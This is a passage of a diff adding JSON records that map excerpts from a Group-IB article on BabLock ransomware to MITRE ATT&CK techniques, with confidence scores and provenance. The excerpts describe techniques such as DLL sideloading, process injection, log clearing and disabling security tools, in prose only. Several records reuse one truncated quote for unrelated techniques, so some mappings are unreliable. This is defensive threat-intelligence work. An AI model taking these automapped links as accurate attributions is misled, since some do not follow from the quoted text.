+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1078.002",
+        "name": "Valid Accounts: Domain Accounts",
+        "parent_id": "T1078",
+        "url": "https://attack.mitre.org/techniques/T1078/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“BabLock Ransomware MITRE ATT&CK | Tactic | Technique | Description | | TA0001 Initial Access | T1190 Exploit Public-Facing Application | As an initial access vector, the attacker used vulnerabilities in the email software Zimbra and as a result gained RDP access to an email…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        }
+      ],
+      "technique": {
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1190"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“BabLock Ransomware MITRE ATT&CK | Tactic | Technique | Description | | TA0001 Initial Access | T1190 Exploit Public-Facing Application | As an initial access vector, the attacker used vulnerabilities in the email software Zimbra and as a result gained RDP access to an email…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1047",
+        "name": "Windows Management Instrumentation",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1047"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“BabLock Ransomware MITRE ATT&CK | Tactic | Technique | Description | | TA0001 Initial Access | T1190 Exploit Public-Facing Application | As an initial access vector, the attacker used vulnerabilities in the email software Zimbra and as a result gained RDP access to an email…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        },
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        }
+      ],
+      "technique": {
+        "id": "T1053.005",
+        "name": "Scheduled Task/Job: Scheduled Task",
+        "parent_id": "T1053",
+        "url": "https://attack.mitre.org/techniques/T1053/005"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "medium",
+      "description": "“The ransomware’s command-line arguments for the task are created based on the arguments of the launched ransomware.” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1059"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“BabLock Ransomware MITRE ATT&CK | Tactic | Technique | Description | | TA0001 Initial Access | T1190 Exploit Public-Facing Application | As an initial access vector, the attacker used vulnerabilities in the email software Zimbra and as a result gained RDP access to an email…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“BabLock Ransomware MITRE ATT&CK | Tactic | Technique | Description | | TA0001 Initial Access | T1190 Exploit Public-Facing Application | As an initial access vector, the attacker used vulnerabilities in the email software Zimbra and as a result gained RDP access to an email…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.003",
+        "name": "Command and Scripting Interpreter: Windows Command Shell",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/003"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“BabLock Ransomware MITRE ATT&CK | Tactic | Technique | Description | | TA0001 Initial Access | T1190 Exploit Public-Facing Application | As an initial access vector, the attacker used vulnerabilities in the email software Zimbra and as a result gained RDP access to an email…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.004",
+        "name": "Command and Scripting Interpreter: Unix Shell",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/004"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“BabLock Ransomware MITRE ATT&CK | Tactic | Technique | Description | | TA0001 Initial Access | T1190 Exploit Public-Facing Application | As an initial access vector, the attacker used vulnerabilities in the email software Zimbra and as a result gained RDP access to an email…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1106",
+        "name": "Native API",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1106"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "medium",
+      "description": "“The ransomware stops the following security, backup, database management and other system services: | vss | ccSetMgr | veeam | | sql | SavRoam | PDVFSService | | svc$ | RTVscan | BackupExecVSSProvider | | memtas | QBFCService | BackupExecAgentAccelerator | | mepocs |…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1569",
+        "name": "System Services",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1569"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“privileges, the attackers use legitimate accounts with administrator rights. | | | T1484.001 Domain Policy Modification: Group Policy Modification | The ransomware uses a group policy to create scheduled tasks on domain hosts to launch the ransomware and stop SQL system…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        },
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1574.001",
+        "name": "Hijack Execution Flow: DLL",
+        "parent_id": "T1574",
+        "url": "https://attack.mitre.org/techniques/T1574/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The correct numeric value must be specified as CODE. | | | T1070.001 Indicator Removal on Host: Clear Windows Event Logs | The ransomware uses wevtutil to clear Windows event logs (Application, Security, System, PowerShell) on compromised hosts. | | | T1112 Modify Registry |…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0112",
+          "name": "Defense Impairment",
+          "order": 7,
+          "shortname": "defense-impairment",
+          "url": "https://attack.mitre.org/tactics/TA0112"
+        }
+      ],
+      "technique": {
+        "id": "T1112",
+        "name": "Modify Registry",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1112"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“In addition, an encrypted payload and a loader in the form of a DLL that implements the technique in question are used. | | | T1055.002 Process Injection: Portable Executable Injection | The loader launches the process notepad.exe and injects a shellcode in it, which loads a…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        },
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1055.002",
+        "name": "Process Injection: Portable Executable Injection",
+        "parent_id": "T1055",
+        "url": "https://attack.mitre.org/techniques/T1055/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“privileges, the attackers use legitimate accounts with administrator rights. | | | T1484.001 Domain Policy Modification: Group Policy Modification | The ransomware uses a group policy to create scheduled tasks on domain hosts to launch the ransomware and stop SQL system…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        },
+        {
+          "id": "TA0112",
+          "name": "Defense Impairment",
+          "order": 7,
+          "shortname": "defense-impairment",
+          "url": "https://attack.mitre.org/tactics/TA0112"
+        }
+      ],
+      "technique": {
+        "id": "T1484.001",
+        "name": "Domain or Tenant Policy Modification: Group Policy Modification",
+        "parent_id": "T1484",
+        "url": "https://attack.mitre.org/techniques/T1484/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“While operating, the ransomware decrypts additional files and strings contained in its body. | | | T1027 Obfuscated Files or Information | To bypass security, an obfuscated loader in the form of a DLL is used, as well as an encrypted payload with the ransomware.” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1027",
+        "name": "Obfuscated Files or Information",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1027"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The winutils.dll module is compressed using a modified UPX 3.96 packer, which does not let it be unpacked using a standard version of UPX.” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1027.002",
+        "name": "Obfuscated Files or Information: Software Packing",
+        "parent_id": "T1027",
+        "url": "https://attack.mitre.org/techniques/T1027/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "low",
+      "description": "“If the size of a file is less than 512 bytes, the file is encrypted fully.” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1027.013",
+        "name": "Obfuscated Files or Information: Encrypted/Encoded File",
+        "parent_id": "T1027",
+        "url": "https://attack.mitre.org/techniques/T1027/013"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "medium",
+      "description": "“The correct numeric value must be specified as CODE. | | | T1070.001 Indicator Removal on Host: Clear Windows Event Logs | The ransomware uses wevtutil to clear Windows event logs (Application, Security, System, PowerShell) on compromised hosts. | | | T1112 Modify Registry |…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1070",
+        "name": "Indicator Removal",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1070"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“In addition, an encrypted payload and a loader in the form of a DLL that implements the technique in question are used. | | | T1055.002 Process Injection: Portable Executable Injection | The loader launches the process notepad.exe and injects a shellcode in it, which loads a…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1140",
+        "name": "Deobfuscate/Decode Files or Information",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1140"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "low",
+      "description": "“As a result of this technique, launching the legitimate file cy.exe will load the malicious winutils.dll (original name: XLOADERDLL.dll), which is located in the same directory.” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1218.011",
+        "name": "System Binary Proxy Execution: Rundll32",
+        "parent_id": "T1218",
+        "url": "https://attack.mitre.org/techniques/T1218/011"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The ransomware terminates processes and services related to security and antivirus software. | | | T1564.010 Hide Artifacts: Process Argument Spoofing | The ransomware launches a system program process in a suspended state, writes command-line parameters directly into PEB, then…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        },
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1497",
+        "name": "Virtualization/Sandbox Evasion",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1497"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The ransomware terminates processes and services related to security and antivirus software. | | | T1564.010 Hide Artifacts: Process Argument Spoofing | The ransomware launches a system program process in a suspended state, writes command-line parameters directly into PEB, then…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1564.010",
+        "name": "Hide Artifacts: Process Argument Spoofing",
+        "parent_id": "T1564",
+        "url": "https://attack.mitre.org/techniques/T1564/010"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "low",
+      "description": "“The shellcode loads the payload PE module contained in it directly into memory.” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1620",
+        "name": "Reflective Code Loading",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1620"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The ransomware is protected with an unidentified protector and contains encrypted strings and data. | | | T1562.001 Impair Defenses: Disable or Modify Tools | The attackers used the utility BEST_uninstallTool.exe to uninstall Bitdefender Endpoint Security Tools.” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0112",
+          "name": "Defense Impairment",
+          "order": 7,
+          "shortname": "defense-impairment",
+          "url": "https://attack.mitre.org/tactics/TA0112"
+        }
+      ],
+      "technique": {
+        "id": "T1685",
+        "name": "Disable or Modify Tools",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1685"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
+      "description": "“The correct numeric value must be specified as CODE. | | | T1070.001 Indicator Removal on Host: Clear Windows Event Logs | The ransomware uses wevtutil to clear Windows event logs (Application, Security, System, PowerShell) on compromised hosts. | | | T1112 Modify Registry |…” — Group-IB Blog",
+      "provenance": {
+        "article_source": "Group-IB Blog",
+        "article_url": "https://www.group-ib.com/blog/bablock-ransomware/",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0112",
+          "name": "Defense Impairment",
+          "order": 7,
+          "shortname": "defense-impairment",
+          "url": "https://attack.mitre.org/tactics/TA0112"
+        }
+      ],
+      "technique": {
+        "id": "T1685.005",
+        "name": "Disable or Modify Tools: Clear Windows Event Logs",
+        "parent_id": "T1685",
+        "url": "https://attack.mitre.org/techniques/T1685/005"
+      }
+    },
+    {
+      "attack_ref": "INC-0259",
+      "confidence": "high",
